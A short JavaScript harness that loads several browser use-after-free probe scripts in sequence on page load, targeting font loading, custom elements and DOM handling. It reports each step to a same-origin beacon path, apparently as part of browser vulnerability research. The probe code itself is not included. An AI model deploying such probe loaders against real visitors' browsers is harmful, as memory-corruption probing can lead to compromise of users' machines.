// p228 — Combined battery: loads p227 probes in sequence
// Runs all three p227 variants to maximize coverage per page load.
// Beacon prefix: V228-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V228-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  // Load probes sequentially via dynamic script injection
  var probes = [
    'p227-fontloader-reentrant.js?v=228',
    'p227-custom-element-uaf.js?v=228',
    'p226-dom-uaf-battery.js?v=228',
    'p227-font-iframe-uaf.js?v=228',
    'p227-fresh-surfaces.js?v=228',
    'p150e-double-call.js?v=150e'
  ];

  var loaded = 0;
  function loadNext() {
    if (loaded >= probes.length) {
      BS('ALL-DONE-' + loaded);
      return;
    }
    var src = probes[loaded];
    BS('LOAD-' + loaded + '-' + src.split('?')[0]);
    var s = document.createElement('script');
    s.onload = function() {
      loaded++;
      BS('OK-' + (loaded - 1));
      // Small delay between probes to let async tests settle
      setTimeout(loadNext, 2000);
    };
    s.onerror = function() {
      BS('ERR-' + loaded);
      loaded++;
      setTimeout(loadNext, 500);
    };
    document.head.appendChild(s);
    s.src = src;
  }

  loadNext();
})();
